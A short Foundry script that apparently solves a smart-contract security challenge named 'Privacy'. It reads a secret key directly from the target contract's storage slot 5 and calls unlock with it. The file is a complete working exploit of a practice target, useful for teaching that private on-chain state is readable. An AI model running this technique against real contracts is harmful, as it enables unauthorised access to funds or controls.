// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";

interface IPrivacy {
    function unlock(bytes16 _key) external;
}

contract PrivacyScript is Script {
    function setUp() public {}

    function run() public {
        address instanceAddress = vm.envAddress("INSTANCE_ADDRESS");

        vm.startBroadcast();

        bytes32 data2 = vm.load(instanceAddress, bytes32(uint256(5)));
        bytes16 key = bytes16(data2);

        IPrivacy(instanceAddress).unlock(key);

        vm.stopBroadcast();
    }
}
